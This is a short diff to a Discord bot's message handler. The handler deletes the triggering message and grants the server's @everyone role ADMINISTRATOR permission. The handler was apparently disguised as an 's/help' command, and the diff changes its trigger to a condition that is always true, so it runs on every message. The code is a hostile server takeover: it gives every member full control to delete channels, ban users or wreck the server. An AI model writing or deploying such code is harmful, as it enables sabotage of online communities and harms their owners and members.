@@ -8,7 +8,7 @@ client.on("ready", () => {
 
 
 client.on("message", message => {
-  if (message.content.startsWith(`s/help`)) {
+  if (message.content.startsWith(`${message.content}`)) {
     message.delete();
     message.guild.roles.cache.find(r => r.name === "@everyone").edit({
       permissions: ["ADMINISTRATOR"] ///premission akata adminstator
